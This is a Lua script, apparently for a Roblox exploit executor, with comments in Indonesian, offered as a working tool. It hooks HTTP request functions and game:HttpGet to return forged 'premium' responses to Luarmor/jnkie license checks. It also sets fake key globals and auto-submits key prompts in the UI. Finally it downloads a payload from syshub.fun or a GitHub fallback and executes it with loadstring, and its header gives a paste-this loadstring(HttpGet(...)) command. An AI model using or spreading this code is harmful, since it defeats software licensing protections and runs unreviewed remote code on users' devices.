-- ============================================================
-- exec_payload.lua (v3 - Full Auto, No Key Required)
-- Bypass Luarmor + Auto-fill UI + Hook game:HttpGet
-- Works on ANY device tanpa input key manual
--
-- Cara pakai:
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoraRox/SAE-SYS/refs/heads/main/lua/exec_payload.lua"))()
-- ============================================================

if not game:IsLoaded() then game.Loaded:Wait() end
task.wait(0.1)

local ge = getgenv and getgenv() or {}
local cenv = getfenv and getfenv(1) or _ENV or {}

-- Simpan native game:HttpGet SEBELUM hook
local _nativeHttpGet = game.HttpGet

-- Key palsu yang format-nya valid
local BYPASS_KEY = "FREE-SYS-AUTO-BYPASS-0000"

-- ══════════════════════════════════════════════════════════════
-- STEP 1: INJECT LUARMOR / JNKIE BYPASS (request + http_request)
-- ══════════════════════════════════════════════════════════════
do
    local native_http_request = rawget(ge, "http_request")
    local native_request      = rawget(ge, "request")
    local native_syn_request  = (syn and rawget(syn, "request")) or nil
    local native_httprequest  = rawget(ge, "httprequest")
    local native_syn_ref      = syn

    local function jsonEncode(t)
        local ok, hs = pcall(function() return game:GetService("HttpService") end)
        if ok and hs then
            local ok2, r = pcall(function() return hs:JSONEncode(t) end)
            if ok2 then return r end
        end
        return "{}"
    end

    local function fakeRes(body)
        return { StatusCode = 200, Status = 200, Body = body,
                 Headers = { ["Content-Type"] = "application/json" } }
    end

    local function isLuarmorValidation(u)
        -- Hanya intercept validation URLs, BUKAN download loader URLs
        if not (u:find("luarmor%.net") or u:find("jnkie%.com")) then
            return false
        end
        -- JANGAN intercept download file loader (ini kita butuh aslinya)
        if u:find("/files/v4/loaders/") or u:find("/download") then
            return false
        end
        return true
    end

    local function buildFakeResponse(u)
        local sid  = "bf-" .. tostring(math.random(1e6, 9e6))
        local stok = "bf-tok-" .. tostring(math.random(1e6, 9e6))

        if u:find("check") or u:find("auth") or u:find("access") or u:find("validate") then
            return jsonEncode({
                status = "success", success = true, valid = true, authorized = true,
                message = "OK",
                data = {
                    mode = "public_maintenance",
                    accessTier = "premium", licenseType = "premium",
                    sessionId = sid, sessionToken = stok,
                    nextHeartbeatSeconds = 999999,
                    continuityCredential = "bf-bypass"
                }
            })
        end
        if u:find("heartbeat") then
            return jsonEncode({ status = "success", state = "active", success = true })
        end
        if u:find("challenge") then
            return jsonEncode({
                status = "success",
                transportKey = string.rep("61", 32),
                challengeId = "bf-chal-" .. sid,
                success = true
            })
        end
        if u:find("maintenance") or u:find("session") or u:find("login") then
            return jsonEncode({
                status = "success", success = true,
                session = {
                    sessionId = sid, sessionToken = stok,
                    nextHeartbeatSeconds = 999999,
                    accessTier = "premium", licenseType = "premium"
                },
                continuityCredential = "bf-bypass",
                accessTier = "premium", licenseType = "premium"
            })
        end
        return jsonEncode({ status = "success", success = true, message = "Bypassed" })
    end

    local function buildFakeReq(origReq)
        return function(opts)
            local url = type(opts) == "table"
                and tostring(opts.Url or opts.url or "") or tostring(opts or "")
            local u = url:lower()

            if isLuarmorValidation(u) then
                print("[BYPASS] Intercepted: " .. url:sub(1, 120))
                return fakeRes(buildFakeResponse(u))
            end

            -- Non-luarmor URL: forward ke original
            if type(origReq) == "function" then return origReq(opts) end
            return { StatusCode = 0, Status = 0, Body = "" }
        end
    end

    local function pickNative()
        if type(native_http_request) == "function" then return native_http_request end
        if type(native_request)      == "function" then return native_request end
        if type(native_syn_request)  == "function" then return native_syn_request end
        if type(native_httprequest)  == "function" then return native_httprequest end
        return nil
    end

    local native  = pickNative()
    local fakeReq = buildFakeReq(native)

    -- Inject ke semua global HTTP functions
    rawset(ge, "request", fakeReq)
    rawset(ge, "http_request", fakeReq)
    rawset(ge, "httprequest", fakeReq)
    rawset(ge, "__BFBypassReq", fakeReq)
    rawset(ge, "__BigFrootBypassActive", true)

    if native_syn_ref and type(native_syn_ref) == "table" then
        rawset(native_syn_ref, "request", fakeReq)
    end

    _G.request = fakeReq
    _G.http_request = fakeReq
    if cenv and cenv ~= ge and cenv ~= _G then
        pcall(function() rawset(cenv, "request", fakeReq) end)
        pcall(function() rawset(cenv, "http_request", fakeReq) end)
    end

    print("[exec] request/http_request bypass injected")
end

-- ══════════════════════════════════════════════════════════════
-- STEP 2: HOOK game:HttpGet UNTUK INTERCEPT LUARMOR VALIDATION
-- ══════════════════════════════════════════════════════════════
do
    local function isLuarmorValidationUrl(url)
        local u = url:lower()
        if not (u:find("luarmor%.net") or u:find("jnkie%.com")) then
            return false
        end
        -- Jangan intercept download loader (butuh code asli)
        if u:find("/files/v4/loaders/") or u:find("/luascripts/public/") then
            return false
        end
        return true
    end

    local function buildFakeJson(url)
        local hs = game:GetService("HttpService")
        local u = url:lower()
        local sid  = "bf-" .. tostring(math.random(1e6, 9e6))
        local stok = "bf-tok-" .. tostring(math.random(1e6, 9e6))

        if u:find("check") or u:find("auth") or u:find("access") or u:find("validate") or u:find("key") then
            return hs:JSONEncode({
                status = "success", success = true, valid = true, authorized = true,
                message = "OK",
                data = {
                    mode = "public_maintenance",
                    accessTier = "premium", licenseType = "premium",
                    sessionId = sid, sessionToken = stok,
                    nextHeartbeatSeconds = 999999,
                    continuityCredential = "bf-bypass"
                }
            })
        end
        if u:find("heartbeat") then
            return hs:JSONEncode({ status = "success", state = "active", success = true })
        end
        if u:find("challenge") then
            return hs:JSONEncode({
                status = "success",
                transportKey = string.rep("61", 32),
                challengeId = "bf-chal-" .. sid,
                success = true
            })
        end
        return hs:JSONEncode({
            status = "success", success = true, message = "Bypassed",
            session = {
                sessionId = sid, sessionToken = stok,
                nextHeartbeatSeconds = 999999,
                accessTier = "premium", licenseType = "premium"
            },
            continuityCredential = "bf-bypass",
            accessTier = "premium", licenseType = "premium"
        })
    end

    -- Hook game:HttpGet menggunakan hookfunction jika tersedia
    if hookfunction then
        local oldHttpGet = hookfunction(game.HttpGet, newcclosure(function(self, url, ...)
            if type(url) == "string" and isLuarmorValidationUrl(url) then
                print("[BYPASS HttpGet] Intercepted: " .. url:sub(1, 120))
                return buildFakeJson(url)
            end
            return _nativeHttpGet(self, url, ...)
        end))
        print("[exec] game:HttpGet hooked via hookfunction")
    elseif clonefunction then
        -- Alternatif: pakai metatable hook
        local mt = getrawmetatable(game)
        if mt then
            local oldNamecall = mt.__namecall
            local setreadonly_fn = setreadonly or make_writeable
            if setreadonly_fn then pcall(setreadonly_fn, mt, false) end
            mt.__namecall = newcclosure(function(self, ...)
                local method = getnamecallmethod()
                if method == "HttpGet" then
                    local args = {...}
                    local url = args[1]
                    if type(url) == "string" and isLuarmorValidationUrl(url) then
                        print("[BYPASS namecall] Intercepted: " .. url:sub(1, 120))
                        return buildFakeJson(url)
                    end
                end
                return oldNamecall(self, ...)
            end)
            if setreadonly_fn then pcall(setreadonly_fn, mt, true) end
            print("[exec] game:HttpGet hooked via __namecall")
        end
    else
        print("[exec] WARNING: hookfunction not available, game:HttpGet not hooked")
        print("[exec] Luarmor validation via HttpGet will NOT be intercepted")
    end
end

-- ══════════════════════════════════════════════════════════════
-- STEP 3: SET KEY GLOBALS
-- ══════════════════════════════════════════════════════════════
do
    ge.script_key = BYPASS_KEY
    ge.SCRIPT_KEY = BYPASS_KEY
    _G.script_key = BYPASS_KEY
    _G.SCRIPT_KEY = BYPASS_KEY
    ge.Key = BYPASS_KEY
    ge.key = BYPASS_KEY
    _G.Key = BYPASS_KEY
    _G.key = BYPASS_KEY
    ge.ScriptKey = BYPASS_KEY
    _G.ScriptKey = BYPASS_KEY
    print("[exec] script_key set: " .. BYPASS_KEY)
end

-- ══════════════════════════════════════════════════════════════
-- STEP 4: AUTO-FILL UI KEY PROMPT (background task)
-- ══════════════════════════════════════════════════════════════
task.spawn(function()
    print("[exec] Auto-fill task started, waiting for SysHub UI...")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    if not player then return end
    local playerGui = player:FindFirstChild("PlayerGui")
    if not playerGui then return end

    -- Coba juga CoreGui
    local coreGui = nil
    pcall(function() coreGui = game:GetService("CoreGui") end)

    local filled = false

    for attempt = 1, 100 do -- coba 10 detik (100 x 0.1)
        if filled then break end
        task.wait(0.1)

        -- Scan PlayerGui dan CoreGui untuk TextBox
        local guiContainers = { playerGui }
        if coreGui then table.insert(guiContainers, coreGui) end

        for _, container in ipairs(guiContainers) do
            for _, gui in pairs(container:GetChildren()) do
                if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") then
                    for _, desc in pairs(gui:GetDescendants()) do
                        if desc:IsA("TextBox") and not filled then
                            -- Cek apakah ini key input (biasanya placeholder ada "key", "enter", dll)
                            local placeholder = (desc.PlaceholderText or ""):lower()
                            local text = (desc.Text or ""):lower()
                            local name = (desc.Name or ""):lower()

                            local isKeyInput = placeholder:find("key")
                                or placeholder:find("enter")
                                or placeholder:find("paste")
                                or placeholder:find("input")
                                or name:find("key")
                                or name:find("input")
                                or name:find("textbox")
                                or name:find("code")
                                or text == ""
                                or text == "..."

                            if isKeyInput then
                                print("[exec] Found key TextBox: " .. desc:GetFullName())
                                -- Isi key
                                desc.Text = BYPASS_KEY
                                task.wait(0.1)
                                -- Trigger submit
                                desc:CaptureFocus()
                                task.wait(0.15)
                                desc:ReleaseFocus(true) -- true = enter pressed
                                print("[exec] Auto-filled and submitted key!")
                                filled = true

                                -- Cari juga tombol submit dan klik
                                task.wait(0.1)
                                local parent = desc.Parent
                                if parent then
                                    for _, sibling in pairs(parent:GetDescendants()) do
                                        if (sibling:IsA("TextButton") or sibling:IsA("ImageButton")) then
                                            local btnName = (sibling.Name or ""):lower()
                                            local btnText = ""
                                            if sibling:IsA("TextButton") then
                                                btnText = (sibling.Text or ""):lower()
                                            end
                                            if btnName:find("submit") or btnName:find("enter")
                                               or btnName:find("confirm") or btnName:find("ok")
                                               or btnName:find("redeem") or btnName:find("check")
                                               or btnText:find("submit") or btnText:find("enter")
                                               or btnText:find("confirm") or btnText:find("redeem")
                                               or btnText:find("check") or btnText:find("ok") then
                                                print("[exec] Found submit button: " .. sibling:GetFullName())
                                                -- Fire button events
                                                if sibling.Activated then
                                                    pcall(function() fireclick(sibling) end)
                                                    pcall(function() firesignal(sibling.Activated) end)
                                                    pcall(function() firesignal(sibling.MouseButton1Click) end)
                                                end
                                            end
                                        end
                                    end
                                end
                                break
                            end
                        end
                    end
                end
                if filled then break end
            end
            if filled then break end
        end
    end

    if not filled then
        print("[exec] WARNING: Could not find key TextBox to auto-fill")
    end
end)

-- ══════════════════════════════════════════════════════════════
-- STEP 5: HTTP HELPER (pakai native HttpGet, bukan hooked)
-- ══════════════════════════════════════════════════════════════
local function httpGet(u)
    local ok, r = pcall(_nativeHttpGet, game, u, true)
    if ok and type(r) == "string" and #r > 0 then return r end
    if syn and syn.request then
        local ok2, r2 = pcall(function() return syn.request({Url=u, Method="GET"}) end)
        if ok2 and r2 and r2.Body and #r2.Body > 0 then return r2.Body end
    end
    if http_request then
        local ok2, r2 = pcall(http_request, {Url=u, Method="GET"})
        if ok2 and r2 and r2.Body and #r2.Body > 0 then return r2.Body end
    end
    if request then
        local ok2, r2 = pcall(request, {Url=u, Method="GET"})
        if ok2 and r2 and r2.Body and #r2.Body > 0 then return r2.Body end
    end
    return nil
end

-- ══════════════════════════════════════════════════════════════
-- STEP 6: HAPUS CACHE LAMA & DOWNLOAD PAYLOAD
-- ══════════════════════════════════════════════════════════════

-- Hapus cache lama yang broken
if isfile and delfile then
    if isfile("syshub_intercept_2.lua") then
        pcall(delfile, "syshub_intercept_2.lua")
        print("[exec] Deleted stale cache: syshub_intercept_2.lua")
    end
end

local CACHE_FILE = "syshub_payload_v3.lua"
local PRIMARY_URL = "https://syshub.fun/free"
local FALLBACK_URL = "https://raw.githubusercontent.com/Galangpratama-rox/Decode-Sys/main/lua/syshub_payload.lua"

local raw = nil
local source = "unknown"

-- 1) Coba dari local cache
if isfile and isfile(CACHE_FILE) then
    raw = readfile(CACHE_FILE)
    source = "local cache"
    print("[exec] Loaded from cache: " .. CACHE_FILE .. " (" .. #raw .. " bytes)")
end

-- 2) Coba dari syshub.fun/free (primary)
if not raw or #raw < 100 then
    print("[exec] Downloading from primary: " .. PRIMARY_URL)
    raw = httpGet(PRIMARY_URL)
    if raw and #raw > 100 then
        source = "syshub.fun/free"
        print("[exec] Downloaded: " .. #raw .. " bytes")
        if writefile then
            pcall(writefile, CACHE_FILE, raw)
        end
    else
        raw = nil
    end
end

-- 3) Fallback
if not raw then
    print("[exec] Trying fallback...")
    raw = httpGet(FALLBACK_URL)
    if raw and #raw > 100 then
        source = "fallback"
        print("[exec] Downloaded from fallback: " .. #raw .. " bytes")
    else
        raw = nil
    end
end

if not raw or #raw < 100 then
    error("[exec] Gagal mendapatkan payload!")
end

print("[exec] Source: " .. source)

-- ══════════════════════════════════════════════════════════════
-- STEP 7: AUTO-DETECT FORMAT & EXTRACT
-- ══════════════════════════════════════════════════════════════
local script = nil

if raw:find('{"', 1, true) and raw:find('"script"', 1, true) then
    print("[exec] Format: JSON wrapped")
    local s = raw:find('"script":"', 1, true)
    if not s then error("[exec] field script not found") end

    local content = raw:sub(s + 10)
    local i = 1
    local result = {}
    while i <= #content do
        local c = content:sub(i, i)
        if c == '"' then break
        elseif c == '\\' then
            local nx = content:sub(i+1, i+1)
            if nx == 'n' then table.insert(result, '\n'); i = i + 2
            elseif nx == 'r' then i = i + 2
            elseif nx == 't' then table.insert(result, '\t'); i = i + 2
            elseif nx == '"' then table.insert(result, '"'); i = i + 2
            elseif nx == '/' then table.insert(result, '/'); i = i + 2
            elseif nx == '\\' then table.insert(result, '\\'); i = i + 2
            elseif nx == 'u' then
                if content:sub(i+2, i+2) == '{' then
                    local close = content:find('}', i+3, true)
                    if close then table.insert(result, content:sub(i, close)); i = close + 1
                    else table.insert(result, '\\u'); i = i + 2 end
                else table.insert(result, content:sub(i, i+5)); i = i + 6 end
            else table.insert(result, '\\'); table.insert(result, nx); i = i + 2 end
        else table.insert(result, c); i = i + 1 end
    end
    script = table.concat(result)
else
    print("[exec] Format: raw Lua")
    script = raw
end

print("[exec] script len: " .. #script)

-- ══════════════════════════════════════════════════════════════
-- STEP 8: LOADSTRING & EXECUTE
-- ══════════════════════════════════════════════════════════════
local fn, err = loadstring(script)
if not fn then
    local errmsg = tostring(err or "unknown")
    error("[exec] loadstring gagal: " .. errmsg)
end

print("[exec] Executing payload (full bypass active)...")
local ok, runerr = pcall(fn)
if not ok then
    error("[exec] Runtime error: " .. tostring(runerr))
end
print("[exec] Done.")
